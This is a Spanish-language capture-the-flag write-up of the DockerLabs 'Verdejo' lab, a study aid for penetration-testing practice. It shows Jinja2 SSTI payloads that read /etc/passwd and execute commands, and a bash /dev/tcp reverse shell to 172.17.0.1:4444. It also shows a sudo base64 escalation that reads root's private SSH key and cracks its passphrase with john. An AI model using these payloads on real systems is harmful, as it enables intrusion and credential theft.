---
title: DockerLabs - Verdejo
summary: "Write-up del laboratorio Verdejo de DockerLabs"
author: elcybercurioso
date: 2025-10-28 12:00
categories: [Post, DockerLabs]
tags: [fácil, ssti, sudo]
media_subpath: "/assets/img/posts/dockerlabs_verdejo"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Verdejo]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8089/tcp open  unknown
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Verdejo]
└─$ nmap -sCV -p22,80,8089 172.17.0.2                          
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 dc:98:72:d5:05:7e:7a:c0:14:df:29:a1:0e:3d:05:ba (ECDSA)
|_  256 39:42:28:c9:c8:fa:05:de:89:e6:37:62:4d:8b:f3:63 (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.59 (Debian)
8089/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-title: Dale duro bro
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
```

## análisis

Tras revisar el puerto 80 del laboratorio, no encontramos ninguna forma de seguir.

Por ello, seguimos revisando el puerto 8089:

![Desktop View](/20251028004643.webp){: width="972" height="589" .shadow}

Probamos a ver si es vulnerable a un ataque **SSTI** (Server Site Template Injection), y resulta que sí que lo es:

![Desktop View](/20251028004740.webp){: width="972" height="589" .shadow}

## acceso inicial (verde)

En [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) podemos encontrar numerosos payloads que podemos ir probando hasta dar con algunos que nos valgan para cada caso.

Para leer ficheros podemos emplear el siguiente payload ([PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---read-remote-file)):

{% raw %}
```bash
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```
{% endraw %}

![Desktop View](/20251028004933.webp){: width="972" height="589" .shadow}

Sin embargo, el siguiente payload nos interesa más, ya que nos permite ejecutar comandos: ([PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#exploit-the-ssti-by-calling-subprocesspopen)):

{% raw %}
```bash
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```
{% endraw %}

![Desktop View](/20251028005131.webp){: width="972" height="589" .shadow}

Empleando el payload anterior que nos permite ejecutar comandos, obtenemos una reverse shell en la máquina:

![Desktop View](/20251028011504.webp){: width="972" height="589" .shadow}

El payload empleado:

{% raw %}
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1\'').read() }}
```
{% endraw %}

Vemos que obtenemos acceso a la maquina como el usuario `verde`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Verdejo]
└─$ nc -nlvp 4444                                                        
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 50248
verde@b2cec569817d:~$ whoami
whoami
verde
```

Tratamos la tty para poder operar en una consola completamente interactiva:

```bash
verde@b2cec569817d:~$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.
verde@b2cec569817d:~$ ^Z
zsh: suspended  nc -nlvp 4444
                                                                                                                                                                                                                  
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Verdejo]
└─$ stty raw -echo;fg             
[1]  + continued  nc -nlvp 4444
                               reset xterm
verde@b2cec569817d:~$ export TERM=xterm
verde@b2cec569817d:~$ export SHELL=bash
verde@b2cec569817d:~$ stty rows 51 columns 211
```

## escalada de privilegios (root)

Revisamos los permisos SUDO del usuario `verde`, y vemos que puede ejecutar el binario `base64` como el usuario `root`:

```bash
verde@b2cec569817d:~$ sudo -l
Matching Defaults entries for verde on b2cec569817d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User verde may run the following commands on b2cec569817d:
    (root) NOPASSWD: /usr/bin/base64
```

 Encontramos en [GTFOBins](https://gtfobins.github.io/gtfobins/base64/#sudo) que cuando tengamos permisos SUDO sobre el binario `base64` podemos leer ficheros con permisos de `root`:

![Desktop View](/20251028011841.webp){: width="972" height="589" .shadow}

Tras revisar algunos ficheros, nos damos cuenta de que en la carpeta `/root/.ssh/`, el fichero `id_rsa` existe, y debido a los permisos SUDO, lo podemos leer:

```bash
verde@b2cec569817d:~$ sudo base64 "/root/.ssh/id_rsa" | base64 --decode
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAHul0xZQ
r68d1eRBMAoL1IAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDbTQGZZWBB
...
Il/gI3f1l4YTSf/u4JbWrZq+eM4rXwV0pKEzt0BAwOQyGmYkFLWXjI/qtVsoeOGM6dHl1y
U21YeBLGkC2aAEPH7sOcaU5rbR9ra6Fb22zgkso3f6lrLzuz/AB9XjF571YzdDdZ/36xEW
vEACJSQrQKz9mWnewtRP5pzZk=
-----END OPENSSH PRIVATE KEY-----
```

Esto nos permite acceder a la maquina como el usuario `root` sin proporcionar la contraseña. Sin embargo, vemos que la clave id_rsa se encuentra encriptada:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Verdejo]
└─$ ssh -i id_rsa root@172.17.0.2                                                      
Enter passphrase for key 'id_rsa': 
root@172.17.0.2's password:
```

Por ello, podemos tratar de obtener la clave por fuerza bruta:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Verdejo]
└─$ john -w=/usr/share/seclists/Passwords/rockyou.txt hash 
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
h*****           (id_rsa)     
```

Indicando la clave, vemos que ahora accedemos correctamente a la maquina como el usuario `root`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Verdejo]
└─$ ssh -i id_rsa root@172.17.0.2                         
Enter passphrase for key 'id_rsa': 
root@b2cec569817d:~# whoami
root
```

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>